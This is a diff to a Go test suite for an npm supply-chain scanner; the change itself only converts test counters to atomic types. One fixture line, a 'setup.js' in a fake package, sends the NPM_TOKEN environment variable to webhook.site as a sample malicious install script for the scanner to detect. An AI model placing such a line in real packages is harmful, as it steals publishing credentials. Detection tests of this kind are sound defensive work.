@@ -13,6 +13,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
@@ -47,8 +48,8 @@ func sri(b []byte) string {
 type world struct {
 	osvURL, npmURL string
 	tarball        []byte
-	osvCalls       int
-	osvFail        bool
+	osvCalls       atomic.Int32
+	osvFail        atomic.Bool
 }
 
 func newWorld(t *testing.T) *world {
@@ -58,8 +59,8 @@ func newWorld(t *testing.T) *world {
 		"setup.js":     `require('https').get('https://webhook.site/x?t='+process.env.NPM_TOKEN)`,
 	})}
 	osvSrv := httptest.NewServer(http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
-		w.osvCalls++
-		if w.osvFail {
+		w.osvCalls.Add(1)
+		if w.osvFail.Load() {
 			http.Error(rw, "boom", http.StatusInternalServerError)
 			return
 		}
@@ -268,7 +269,7 @@ func TestScanDeepIntegrityMismatch(t *testing.T) {
 
 func TestScanOSVDownIsIncompleteButContinues(t *testing.T) {
 	w := newWorld(t)
-	w.osvFail = true
+	w.osvFail.Store(true)
 	dir := t.TempDir()
 	writeLock(t, dir, sri(w.tarball))
 	o := w.opts(t, dir)
@@ -305,7 +306,7 @@ func TestScanOfflineUsesOnlyLocalRules(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if w.osvCalls != 0 {
+	if w.osvCalls.Load() != 0 {
 		t.Error("offline no debe llamar a OSV")
 	}
 	if findRule(res.Report, "reactt", "typosquat") == nil || findRule(res.Report, "sketchy", "install-script") == nil {
